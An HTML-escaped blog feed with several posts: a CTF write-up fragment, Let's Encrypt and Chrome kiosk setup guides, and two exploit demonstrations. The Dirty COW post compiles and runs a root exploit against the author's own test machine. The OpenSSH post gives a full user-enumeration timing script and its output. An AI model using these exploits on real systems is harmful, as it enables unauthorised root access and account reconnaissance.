&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;https://ssc.teaser.insomnihack.ch/login&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;38&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;PHPSESSID=3u5dqmfudc7ap1di0nmfjgtjm3&lt;/span&gt;
&lt;span class="na"&gt;FLAG&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;INS{OkThatWasWay2Easy}&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;keep-alive&lt;/span&gt;

action=login&amp;amp;amp;name=rogue&amp;amp;amp;password=rogue
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The header include the flag for this part and the URL for the second part and
the file send by Rogue. But the file is encrypted. This is part 2.&lt;/p&gt;
&lt;h2&gt;The great escape - part 2&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;No write up for this challenge&lt;/em&gt;&lt;/p&gt;</content><category term="security"></category><category term="ctf"></category></entry><entry><title>Let's encrypt certificate for offline servers with OVH DNS</title><link href="https://matthieukeller.com/2016/12/lets-encrypt-certificate-for-offline-servers-with-ovh-dns.html" rel="alternate"></link><published>2016-12-27T11:58:00+01:00</published><updated>2016-12-27T11:58:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2016-12-27:/2016/12/lets-encrypt-certificate-for-offline-servers-with-ovh-dns.html</id><summary type="html">&lt;p&gt;&lt;a href="https://letsencrypt.org/"&gt;Let's encrypt&lt;/a&gt; provide free and easy SSLÂ certificates. Nevertheless it need to verify that
you own the machine. In order to do that we usually use HTTP verification with
the .well-known directory.&lt;/p&gt;
&lt;p&gt;But sometime our servers are not reachable from the internet. Therefore the HTTP
validation is not possible. Hopefully there is another way the &lt;a href="https://letsencrypt.github.io/acme-spec/"&gt;acme&lt;/a&gt; challenge can be
validated: &lt;a href="https://letsencrypt.github.io/acme-spec/#rfc.section.7.4"&gt;DNS validation&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In this post we will see how we can generate &lt;a href="https://letsencrypt.org/"&gt;Let's encrypt&lt;/a&gt; SSL certificate for
offline machine with DNS validation for domains hosts by &lt;a href="https://ovh.com"&gt;OVH&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;a href="https://letsencrypt.org/"&gt;Let's encrypt&lt;/a&gt; provide free and easy SSLÂ certificates. Nevertheless it need to verify that
you own the machine. In order to do that we usually use HTTP verification with
the .well-known directory.&lt;/p&gt;
&lt;p&gt;But sometime our servers are not reachable from the internet. Therefore the HTTP
validation is not possible. Hopefully there is another way the &lt;a href="https://letsencrypt.github.io/acme-spec/"&gt;acme&lt;/a&gt; challenge can be
validated: &lt;a href="https://letsencrypt.github.io/acme-spec/#rfc.section.7.4"&gt;DNS validation&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In this post we will see how we can generate &lt;a href="https://letsencrypt.org/"&gt;Let's encrypt&lt;/a&gt; SSL certificate for
offline machine with DNS validation for domains hosts by &lt;a href="https://ovh.com"&gt;OVH&lt;/a&gt;.&lt;/p&gt;


&lt;h2&gt;Certificate generation&lt;/h2&gt;
&lt;h3&gt;Requirements&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A domain name with its DNS hosted by &lt;a href="https://ovh.com"&gt;OVH&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;curl (sudo apt-get install curl)&lt;/li&gt;
&lt;li&gt;Python 2 or 3 and pip (sudo apt-get install python-pip)&lt;/li&gt;
&lt;li&gt;python-ovh (pip install ovh)&lt;/li&gt;
&lt;li&gt;dehydrated (git clone https://github.com/lukas2511/dehydrated)&lt;/li&gt;
&lt;li&gt;OVH hook (git clone https://github.com/antoiner77/letsencrypt.sh-ovh)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;API Key generation&lt;/h3&gt;
&lt;p&gt;We need API keys in order to use the hook script for the DNS validation. For
that, register the application on [OVH API] (https://eu.api.ovh.com/createApp/).&lt;/p&gt;
&lt;p&gt;We get two elements from the website:
&lt;em&gt; APP_KEY
&lt;/em&gt; APP_SECRET&lt;/p&gt;
&lt;p&gt;We need to put them in our &lt;code&gt;ovh.conf&lt;/code&gt; file in the OVH hook script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[default]
; general configuration: default endpoint
endpoint=ovh-eu

[ovh-eu]
; configuration specific to &amp;#39;ovh-eu&amp;#39; endpoint
application_key=APP_KEY
application_secret=APP_SECRET
; uncomment following line when writing a script application
; with a single consumer key.
;consumer_key=MA_CLEFS
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we need to generate the use token in order to validation our keys (you may
need to had execution permissions to the script):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./ovhdns.py --init
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We get an other link where we need to authenticate one more time. When it is
done just press the &lt;code&gt;ENTER&lt;/code&gt; key.&lt;/p&gt;
&lt;p&gt;The script indicate the user token to insert in the &lt;code&gt;ovh.conf&lt;/code&gt; file. Be sure to
uncomment the line by deleting the &lt;code&gt;;&lt;/code&gt; at the beginning of the line.&lt;/p&gt;
&lt;p&gt;The configuration file will be needed in the &lt;code&gt;dehydrated&lt;/code&gt; folder, let's just
create a symlink:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ln -s /home/user/letsencrypt.sh-ovh/ovh.conf /home/user/dehydrated/ovh.conf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The hook script configuration is finished, now let's configure the &lt;code&gt;dehydrated&lt;/code&gt;
script.&lt;/p&gt;
&lt;h3&gt;dehydrated configuration&lt;/h3&gt;
&lt;p&gt;In the domains.txt file, indicate the certificates that you want to generate.
Each line will be a certificate but one certificate can be valid for several
domains. For instance, the following configuration will generate two certificates
each for two domains.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;example.org www.example.org
gitlab.example.com wikimedia.example.com
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Certificates generation&lt;/h3&gt;
&lt;p&gt;Just launch the dehydrated script (you may need to had execution permission):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./dehydrated -c -t dns-01 -k &amp;#39;/home/user/letsencrypt.sh-ovh/ovhdns.py&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-c&lt;/code&gt; (re)generate certificates, will renew them if they expire in less than one month&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-t dns-01&lt;/code&gt; use the DNS challenge for acme validation&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-k&lt;/code&gt; use specific script for hook&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The certificates are stored in &lt;code&gt;/home/user/dehydrated/certs/&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Automatically renew certificates&lt;/h2&gt;
&lt;p&gt;In order to automatically renew certificate:&lt;/p&gt;
&lt;p&gt;Create a symlink in order to use the certificate and the necessary key. This
is the only moment where we will need root permissions. For
instance, for the gitlab certificate we need &lt;code&gt;gitlab.crt&lt;/code&gt; and &lt;code&gt;gitlab.key&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# ln -s /home/user/dehydrated/certs/git.exemple.fr/fullchain.pem /etc/gitlab/ssl/gitlab.crt
# ln -s /home/user/dehydrated/certs/git.exemple.fr/privkey.pem /etc/gitlab/ssl/gitlab.key
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Add the following line to the crontab (&lt;code&gt;crontab -e&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0 15 * * * cd /home/user/dehydrated/; ./dehydrated  -c -t dns-01 -k &amp;#39;/home/user/letsencrypt.sh-ovh/ovhdns.py&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Source&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://ungeek.fr/letsencrypt-api-ovh/"&gt;https://ungeek.fr/letsencrypt-api-ovh/&lt;/a&gt;&lt;/p&gt;</content><category term="programming"></category><category term="SSL"></category><category term="let's encrypt"></category></entry><entry><title>Building a kiosk computer with Chrome</title><link href="https://matthieukeller.com/2016/12/building-a-kiosk-computer-with-chrome.html" rel="alternate"></link><published>2016-12-26T09:10:00+01:00</published><updated>2016-12-26T09:10:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2016-12-26:/2016/12/building-a-kiosk-computer-with-chrome.html</id><summary type="html">&lt;p&gt;Building a Kiosk where Google Chrome is running in full screen and user
interaction with the system are reduced to the minimum.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;Building a Kiosk where Google Chrome is running in full screen and user
interaction with the system are reduced to the minimum.&lt;/p&gt;


&lt;h2&gt;Debian installation&lt;/h2&gt;
&lt;p&gt;This will be pass as most of you should be able to install a basic Debian
system. Just set lvm encryption, strong password for root and for the user and
mostly do not install useless program, check only the program you need (ssh for
instance).&lt;/p&gt;
&lt;h2&gt;Installing the packages&lt;/h2&gt;
&lt;p&gt;We will need a few more packages to be able to run things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;X (display server)&lt;/li&gt;
&lt;li&gt;A light window manager able to run Chrome in full screen&lt;/li&gt;
&lt;li&gt;Google Chrome&lt;/li&gt;
&lt;li&gt;sudo to be able to impersonate the user&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first operations will be done using root as the sudo command is not
installed yet.&lt;/p&gt;
&lt;p&gt;First we add the Google Chrome repository and the key to check the package
integrity:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Edit the file &lt;code&gt;/etc/apt/source.list&lt;/code&gt; and add the following repository:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;deb http://dl.google.com/linux/chrome/deb/ stable main&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Execute the following command:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;wget -qO- https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Then we need to update the package list and install all necessary packages:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;apt-get update
apt-get install --no-install-recommends xorg openbox sudo google-chrome-stable
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Without the &lt;code&gt;--no-install-recommends&lt;/code&gt;parameter some useless packages will be
installed.&lt;/p&gt;
&lt;h2&gt;Load Chrome in kiosk at startup&lt;/h2&gt;
&lt;p&gt;We need a script that will configure and load Chrome at the X server startup.
As we don't want any data saved between each session we will delete the Chrome
profile each time the script is used. Moreover it is in this script that we
choose the starting page of Chrome.&lt;/p&gt;
&lt;p&gt;Create and edit the script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo vi /opt/kiosk.sh
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The file content is the following:&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4
5
6
7
8&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;

xset -dpms
xset s off
openbox-session &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;amp&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; true&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; rm -rf ~/.&lt;span class="o"&gt;{&lt;/span&gt;config,cache&lt;span class="o"&gt;}&lt;/span&gt;/google-chrome/
  google-chrome --kiosk --no-first-run  &lt;span class="s1"&gt;&amp;#39;http://localhost&amp;#39;&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;Give the execution right to the script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo chmod +x /opt/kiosk.sh
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In order to start the X server and launch the &lt;code&gt;kiosk.sh&lt;/code&gt; script, we need to
create a systemd service.&lt;/p&gt;
&lt;p&gt;In order to to that, create and edit the file &lt;code&gt;/etc/systemd/system/kiosk.service&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo vi /etc/systemd/system/kiosk.service
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The content of the file is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[Unit]&lt;/span&gt;
&lt;span class="na"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;Kiosk&lt;/span&gt;

&lt;span class="k"&gt;[Service]&lt;/span&gt;
&lt;span class="na"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;oneshot&lt;/span&gt;
&lt;span class="na"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/usr/bin/sudo âu user /usr/bin/startx /etc/X11/Xsession /opt/kiosk.sh --&lt;/span&gt;

&lt;span class="k"&gt;[Install]&lt;/span&gt;
&lt;span class="na"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;multi-user.target&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We need to enable the script with the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;systemctl enable kiosk
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To run the script use the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;systemctl start kiosk Â»
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can also reboot in order to check that the script is automatically launch at
startup.&lt;/p&gt;
&lt;p&gt;If you need a terminal, you can use &lt;ctrl&gt;+&lt;alt&gt;+&lt;F2-9&gt; to get one.&lt;/p&gt;
&lt;h2&gt;Automatically mount USB key&lt;/h2&gt;
&lt;p&gt;If your users need to copy data from the machine this paragraph is for you.
Otherwise this is just informational.&lt;/p&gt;
&lt;p&gt;As our users don't have a shell access they are unable to mount USB key.
Therefore we need to automatically mount them.&lt;/p&gt;
&lt;p&gt;We need the &lt;code&gt;usbmount&lt;/code&gt; package:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;apt-get install --no-install-recommends usbmount
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The USB keys will be automatically mount into &lt;code&gt;/mnt/usbX&lt;/code&gt;.In order for the user
to have the permissions to right on it we need to add its &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;gid&lt;/code&gt; in the
&lt;code&gt;usbmount&lt;/code&gt; configuration.&lt;/p&gt;
&lt;p&gt;Edit the file &lt;code&gt;/etc/usbmount/usbmount.conf&lt;/code&gt; and the user &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;guid&lt;/code&gt; to the
following line (the &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;gid&lt;/code&gt; can be found in &lt;code&gt;/etc/passwd&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;FS_MOUNTOPTIONS=&amp;quot; &amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The line would be something like the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;FS_MOUNTOPTIONS=&amp;quot;uid=1000,gid=1000&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Sources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://thepcspy.com/read/building-a-kiosk-computer-ubuntu-1404-chrome/"&gt;https://thepcspy.com/read/building-a-kiosk-computer-ubuntu-1404-chrome/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://lukas.zapletalovi.com/2013/08/execute-command-during-start-with-systemd.html"&gt;https://lukas.zapletalovi.com/2013/08/execute-command-during-start-with-systemd.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="programming"></category><category term="security"></category><category term="chrome"></category><category term="kiosk"></category></entry><entry><title>CVE 2016-5195 dirtycow</title><link href="https://matthieukeller.com/2016/12/cve-2016-5195-dirtycow.html" rel="alternate"></link><published>2016-12-11T19:20:00+01:00</published><updated>2016-12-11T19:20:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2016-12-11:/2016/12/cve-2016-5195-dirtycow.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2016.12/cow.png" alt="Ãirtycow logo" width="162"&gt;&lt;/p&gt;
&lt;p&gt;Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux
Kernel.
"&lt;a href="https://en.wikipedia.org/wiki/Race_condition"&gt;A race condition&lt;/a&gt; was found in
the way the Linux kernel's memory subsystem
handled the copy-on-write (COW) breakage of private read-only memory mappings.
An unprivileged local user could use this flaw to gain write access to otherwise
read-only memory mappings and thus increase their privileges on the system."
(&lt;a href="https://bugzilla.redhat.com/show_bug.cgi?id=1384344#"&gt;Source: Red Hat&lt;/a&gt;)&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2016.12/cow.png" alt="Ãirtycow logo" width="162"&gt;&lt;/p&gt;
&lt;p&gt;Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux
Kernel.
"&lt;a href="https://en.wikipedia.org/wiki/Race_condition"&gt;A race condition&lt;/a&gt; was found in
the way the Linux kernel's memory subsystem
handled the copy-on-write (COW) breakage of private read-only memory mappings.
An unprivileged local user could use this flaw to gain write access to otherwise
read-only memory mappings and thus increase their privileges on the system."
(&lt;a href="https://bugzilla.redhat.com/show_bug.cgi?id=1384344#"&gt;Source: Red Hat&lt;/a&gt;)&lt;/p&gt;


&lt;p&gt;So globally with the write code doing the right thing a unprivileged user can
get root permission on most GNU/Linux systems.
The satiric web site &lt;a href="https://dirtycow.ninja/"&gt;dirtycow.ninja/&lt;/a&gt; was in the first
time create to make fun of people giving name to vulnerability even a &lt;a href="https://www.youtube.com/watch?v=kEsshExn7aE"&gt;youtube
video&lt;/a&gt; was made. Nevertheless the
wiki of the website (on github) link to a &lt;a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"&gt;few
PoCs&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I test one of this PoCs on my test computer. The exploits were not fully stable
at the time an my computer was sometime friezing just after getting root
privileges.&lt;/p&gt;
&lt;p&gt;I used a modified version of the cowroot.c PoCs host on &lt;a href="https://gist.github.com/joshuaskorich/86c90e12436c873e4a06bd64b461cc43"&gt;a
gist&lt;/a&gt;.
First of all we compile the exploit code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@computer_name dirtycow]$ gcc cowroot.c -o cowroot -pthread
cowroot.c: In function âprocselfmemThreadâ:
cowroot.c:107:17: warning: passing argument 2 of âlseekâ makes integer from pointer without a cast [-Wint-conversion]
         lseek(f,map,SEEK_SET);
                 ^~~
In file included from cowroot.c:27:0:
/usr/include/unistd.h:337:16: note: expected â__off_t {aka long int}â but argument is of type âvoid *â
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^~~~~
cowroot.c: In function âmainâ:
cowroot.c:144:5: warning: implicit declaration of function âasprintfâ [-Wimplicit-function-declaration]
     asprintf(&amp;amp;amp;backup, &amp;quot;cp %s /tmp/bak&amp;quot;, suid_binary);
     ^~~~~~~~
cowroot.c:148:5: warning: implicit declaration of function âfstatâ [-Wimplicit-function-declaration]
     fstat(f,&amp;amp;amp;st);
     ^~~~~
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The warning are not really important after the compilation we just launch the
exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@computer_name dirtycow]$ ./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 47224
Racing, this may take a while..
/usr/bin/passwd overwritten
Popping root shell.
Don&amp;#39;t forget to restore /tmp/bak
thread stopped
thread stopped
[root@computer_name dirtycow]# id
uid=0(root) gid=1000(maggick) groups=1000(maggick)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And we got root privileges as planned. The exploit replace the
&lt;code&gt;/usr/bin/passwd&lt;/code&gt; executable so we need to restore it with the one in
&lt;code&gt;/tmp/bak&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;In order to correct this vulnerability we just need to upgrade our kernel.&lt;/p&gt;</content><category term="cve"></category><category term="security"></category><category term="exploit"></category><category term="test"></category></entry><entry><title>CVE 2016-6210 OpenSSHD user enumeration</title><link href="https://matthieukeller.com/2016/07/cve-2016-6210-opensshd-user-enumeration.html" rel="alternate"></link><published>2016-07-23T08:45:00+02:00</published><updated>2016-07-23T08:45:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2016-07-23:/2016/07/cve-2016-6210-opensshd-user-enumeration.html</id><summary type="html">&lt;p&gt;The 13th if July a new wild CVE appeared (Yes, Pokemon Go is still a buzz for
the moment).&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6210"&gt;CVE 2016-6210&lt;/a&gt;
allow a user enumeration on an SSH server by comparing request time between non
existing user and allowed ones.
This vulnerability target  OpenSSHD with a version of 7.2p2 or inferior.&lt;/p&gt;
&lt;p&gt;That means with a good dictionary you may know which user are
present on the server with an SSH access.&lt;/p&gt;
&lt;p&gt;This post just demonstrate how to exploit this vulnerability with a simple
example.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;The 13th if July a new wild CVE appeared (Yes, Pokemon Go is still a buzz for
the moment).&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6210"&gt;CVE 2016-6210&lt;/a&gt;
allow a user enumeration on an SSH server by comparing request time between non
existing user and allowed ones.
This vulnerability target  OpenSSHD with a version of 7.2p2 or inferior.&lt;/p&gt;
&lt;p&gt;That means with a good dictionary you may know which user are
present on the server with an SSH access.&lt;/p&gt;
&lt;p&gt;This post just demonstrate how to exploit this vulnerability with a simple
example.&lt;/p&gt;


&lt;h2&gt;OpenSSHD &amp;lt;= 7.2p2 - User Enumeration&lt;/h2&gt;
&lt;p&gt;A tiny python script is present on
&lt;a href="https://www.exploit-db.com/exploits/40113/"&gt;exploit-db&lt;/a&gt;. I had to modify it a
bit in order to pass the username in parameter:&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;paramiko&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;25000&lt;/span&gt;
&lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SSHClient&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;starttime&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clock&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_missing_host_key_policy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AutoAddPolicy&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
         &lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.4.231&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
         &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
         &lt;span class="n"&gt;endtime&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clock&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;endtime&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;starttime&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;The script will simply try to connect to &lt;code&gt;192.168.4.231&lt;/code&gt; with the user passed in
parameter and a password of 25 000 'A' and measure the time of the connection.&lt;/p&gt;
&lt;p&gt;We create a simple list of possible user with a non existing user to be able to
compare connection times.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@computer_name tmp]$ cat list
nonExistsingUserForSure
john
root
bob
user
alice
max
ssh_user
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We launch the script against our test server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@computer_name tmp]$ while read l; do ./p.py $l; done &amp;amp;lt; list
nonExistsingUserForSure: 0.17941999999999997
john: 0.18687900000000002
root: 0.18173099999999998
bob: 0.178726
user: 0.23088699999999995
alice: 0.13389600000000002
max: 0.17069700000000004
ssh_user: 0.24780699999999997
